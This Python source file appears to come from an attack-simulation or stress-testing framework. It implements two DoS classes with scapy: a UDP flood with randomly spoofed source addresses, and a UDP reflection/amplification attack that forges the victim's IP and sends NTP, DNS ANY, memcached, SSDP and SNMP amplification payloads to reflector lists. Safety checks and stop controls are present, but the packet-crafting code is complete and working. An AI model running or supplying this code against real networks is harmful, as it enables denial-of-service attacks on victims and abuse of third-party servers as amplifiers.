from __future__ import annotations

import asyncio
import os
import random
import time
import structlog

from app.attacks.base import SafeAttackBase, AttackRegistry, SafetyError
from app.models import AttackCommand, AttackType

logger = structlog.get_logger(__name__)


async def _resolve_host(host: str) -> str:
    """v1.3.0 方案A4: 域名目标解析为数值 IP; IP 原样返回"""
    import ipaddress
    try:
        ipaddress.ip_address(host)
        return host
    except ValueError:
        pass
    loop = asyncio.get_running_loop()
    infos = await loop.getaddrinfo(host, None, family=asyncio.AF_INET, type=asyncio.SOCK_DGRAM)
    resolved = infos[0][4][0]
    logger.info("target_hostname_resolved", host=host, ip=resolved)
    return resolved


try:
    from scapy.all import IP, UDP, Raw, send, RandShort, RandIP, conf
    SCAPY_AVAILABLE = True
except Exception:  # ImportError 之外, 受限网络环境(WSL/容器)下 scapy 探测可能抛 OSError
    SCAPY_AVAILABLE = False


def _check_raw_capability() -> bool:
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("CapEff:"):
                    return bool(int(line.split(":")[1].strip(), 16) & (1 << 13))
    except (IOError, ValueError):
        pass
    return os.geteuid() == 0


class UDPFloodAttack(SafeAttackBase):
    """UDP Flood 攻击 — HIGH-3 修复: asyncio.get_running_loop()"""

    NAME = "udp_flood"
    ATTACK_TYPE = AttackType.UDP_FLOOD
    REQUIRES_ROOT = True
    DEFAULT_RPS = 10000
    DEFAULT_CONCURRENCY = 4

    def __init__(self, command: AttackCommand):
        super().__init__(command)
        self._sender_tasks: list = []
        self.payload_size = int(self.params.headers.get("payload_size", 1024))

    @classmethod
    def pre_flight_check(cls, target: str) -> None:
        super().pre_flight_check(target)
        if not SCAPY_AVAILABLE:
            raise SafetyError("scapy not installed")
        if not _check_raw_capability():
            raise SafetyError("UDP flood requires root or CAP_NET_RAW")

    async def _run(self):
        if not SCAPY_AVAILABLE:
            raise SafetyError("scapy not available")

        target = self.params.target
        # v1.3.0 方案A4: 域名目标先解析为数值 IP (scapy 造包需要)
        target_ip = await _resolve_host(target.ip)
        target_port = target.port
        interface = self.params.interface or conf.iface
        spoof_cidr = self.params.spoof_cidr or "10.0.0.0/8"

        threads = self.params.concurrency
        pps_per_thread = max(1, self.params.rps // threads)
        payload = b"X" * self.payload_size

        logger.info("udp_flood_starting",
                     target=target_ip, port=target_port,
                     threads=threads, pps_per_thread=pps_per_thread,
                     payload_size=self.payload_size, interface=interface)

        loop = asyncio.get_running_loop()
        for i in range(threads):
            task = loop.run_in_executor(
                None,
                self._sender_thread,
                target_ip, target_port, interface, spoof_cidr, pps_per_thread, i, payload
            )
            self._sender_tasks.append(task)

        await asyncio.gather(*self._sender_tasks, return_exceptions=True)

    def _sender_thread(self, target_ip: str, target_port: int, interface: str,
                       spoof_cidr: str, pps: int, thread_id: int, payload: bytes):
        conf.iface = interface
        conf.verb = 0

        interval = 1.0 / pps if pps > 0 else 0.001
        next_send = time.monotonic()
        sent_count = 0
        bytes_sent = 0

        try:
            while not self.EMERGENCY_STOP.is_set() and not self._stop_event.is_set():
                if self._start_time and (time.monotonic() - self._start_time) >= self.params.duration:
                    break

                try:
                    pkt = IP(dst=target_ip, src=RandIP(spoof_cidr)) / \
                          UDP(sport=RandShort(), dport=target_port) / \
                          Raw(load=payload)
                    send(pkt, verbose=0, iface=interface)
                    sent_count += 1
                    bytes_sent += len(pkt)
                except Exception as e:
                    logger.debug("udp_send_failed", thread=thread_id, error=str(e))

                next_send += interval
                sleep_time = next_send - time.monotonic()
                if sleep_time > 0:
                    time.sleep(sleep_time)
                else:
                    next_send = time.monotonic()

            self.result.total_requests += sent_count
            self.result.successful_requests += sent_count
            self.result.bytes_sent += bytes_sent
            self.result.metrics[f"thread_{thread_id}_sent"] = sent_count

        except Exception as e:
            logger.error("udp_thread_error", thread=thread_id, error=str(e))
            self.result.errors.append(f"Thread {thread_id}: {e}")

    async def stop(self, reason: str = "manual"):
        self._stop_event.set()
        if self._sender_tasks:
            await asyncio.gather(*self._sender_tasks, return_exceptions=True)

    async def _cleanup(self):
        self._sender_tasks.clear()


if SCAPY_AVAILABLE:
    AttackRegistry.register(AttackType.UDP_FLOOD, UDPFloodAttack)


# ========== UDP 反射放大攻击 ==========

REFLECTOR_PAYLOADS = {
    "ntp": b"\x17\x00\x03\x2a" + b"\x00" * 4,
    "dns": b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
           b"\x03www\x06google\x03com\x00\x00\xff\x00\x01",
    "memcached": b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n",
    "ssdp": b"M-SEARCH * HTTP/1.1\r\n"
            b"Host: 239.255.255.250:1900\r\n"
            b"Man: \"ssdp:discover\"\r\n"
            b"MX: 1\r\n"
            b"ST: ssdp:all\r\n\r\n",
    "snmp": b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04"
            b"\x71\xb7\x0e\x9c\x02\x01\x00\x02\x01\x00\x30\x0e"
            b"\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00",
}


class UDPReflectionAttack(SafeAttackBase):
    """UDP 反射放大攻击 — HIGH-3 修复: asyncio.get_running_loop()"""

    NAME = "udp_reflection"
    ATTACK_TYPE = AttackType.UDP_REFLECTION
    REQUIRES_ROOT = True
    DEFAULT_RPS = 5000
    DEFAULT_CONCURRENCY = 4

    def __init__(self, command: AttackCommand):
        super().__init__(command)
        self._sender_tasks: list = []
        self.reflector_type = self.params.reflector_type or "ntp"
        self.reflector_list = self.params.reflector_list or []
        self.payload = REFLECTOR_PAYLOADS.get(self.reflector_type, REFLECTOR_PAYLOADS["ntp"])

    @classmethod
    def pre_flight_check(cls, target: str) -> None:
        super().pre_flight_check(target)
        if not SCAPY_AVAILABLE:
            raise SafetyError("scapy not installed")
        if not _check_raw_capability():
            raise SafetyError("UDP reflection requires root or CAP_NET_RAW")

    async def _run(self):
        if not SCAPY_AVAILABLE:
            raise SafetyError("scapy not available")
        if not self.reflector_list:
            raise SafetyError("No reflectors configured")

        # v1.3.0 方案A4: 反射器列表支持域名 — 逐个解析
        resolved_reflectors = []
        for ref in self.reflector_list:
            host = ref.rsplit(":", 1)[0] if ":" in ref else ref
            resolved = await _resolve_host(host)
            resolved_reflectors.append(ref.replace(host, resolved, 1) if host != resolved else ref)
        self.reflector_list = resolved_reflectors

        target_ip = await _resolve_host(self.params.target.ip)
        interface = self.params.interface or conf.iface
        spoof_cidr = self.params.spoof_cidr or "10.0.0.0/8"

        threads = self.params.concurrency
        pps_per_thread = max(1, self.params.rps // threads)

        logger.info("udp_reflection_starting",
                     reflector_type=self.reflector_type,
                     reflector_count=len(self.reflector_list),
                     target=target_ip, threads=threads,
                     pps_per_thread=pps_per_thread, interface=interface)

        loop = asyncio.get_running_loop()
        for i in range(threads):
            task = loop.run_in_executor(
                None,
                self._sender_thread,
                target_ip, interface, spoof_cidr, pps_per_thread, i
            )
            self._sender_tasks.append(task)

        await asyncio.gather(*self._sender_tasks, return_exceptions=True)

    def _sender_thread(self, target_ip: str, interface: str,
                       spoof_cidr: str, pps: int, thread_id: int):
        conf.iface = interface
        conf.verb = 0

        interval = 1.0 / pps if pps > 0 else 0.001
        next_send = time.monotonic()
        sent_count = 0

        try:
            while not self.EMERGENCY_STOP.is_set() and not self._stop_event.is_set():
                if self._start_time and (time.monotonic() - self._start_time) >= self.params.duration:
                    break

                reflector = random.choice(self.reflector_list)
                if ":" in reflector:
                    ref_ip, ref_port = reflector.rsplit(":", 1)
                    ref_port = int(ref_port)
                else:
                    ref_ip = reflector
                    ref_port = {"ntp": 123, "dns": 53, "memcached": 11211,
                                "ssdp": 1900, "snmp": 161}.get(self.reflector_type, 123)

                try:
                    pkt = IP(dst=ref_ip, src=target_ip) / \
                          UDP(sport=RandShort(), dport=ref_port) / \
                          Raw(load=self.payload)
                    send(pkt, verbose=0, iface=interface)
                    sent_count += 1
                except Exception as e:
                    logger.debug("reflection_send_failed", thread=thread_id, error=str(e))

                next_send += interval
                sleep_time = next_send - time.monotonic()
                if sleep_time > 0:
                    time.sleep(sleep_time)
                else:
                    next_send = time.monotonic()

            self.result.total_requests += sent_count
            self.result.successful_requests += sent_count
            self.result.metrics[f"thread_{thread_id}_sent"] = sent_count
            self.result.metrics["reflector_type"] = self.reflector_type

        except Exception as e:
            logger.error("reflection_thread_error", thread=thread_id, error=str(e))
            self.result.errors.append(f"Thread {thread_id}: {e}")

    async def stop(self, reason: str = "manual"):
        self._stop_event.set()
        if self._sender_tasks:
            await asyncio.gather(*self._sender_tasks, return_exceptions=True)

    async def _cleanup(self):
        self._sender_tasks.clear()


if SCAPY_AVAILABLE:
    AttackRegistry.register(AttackType.UDP_REFLECTION, UDPReflectionAttack)